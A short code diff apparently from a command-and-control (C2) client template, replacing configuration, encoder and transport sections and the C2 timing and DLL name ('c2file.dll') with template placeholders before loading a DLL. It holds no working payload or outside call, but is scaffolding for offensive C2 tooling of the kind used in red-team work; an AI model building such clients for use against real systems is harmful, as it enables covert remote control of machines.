@@ -14,22 +14,22 @@ from time import sleep
 
 
 # <configurations>
-
+```[var:::client_consts]```
 # </configurations>
 
 
 # <encoder functions>
-
+```[var:::encoder_code]```
 # </encoder functions>
 
 
 # <transport functions>
-
+```[var:::transport_code]```
 # </transport functions>
 
 # Client core
-C2_BLOCK_TIME = 1.5 # TODO, make me reconfigurable
-CDLL_NAME = 'c2file.dll' # TODO, make me reconfigurable
+C2_BLOCK_TIME = ```[var:::c2_block_time]```
+CDLL_NAME = ```[var:::cdll_name]```
 
 maxlen = 1024*1024
 lib = CDLL(CDLL_NAME)
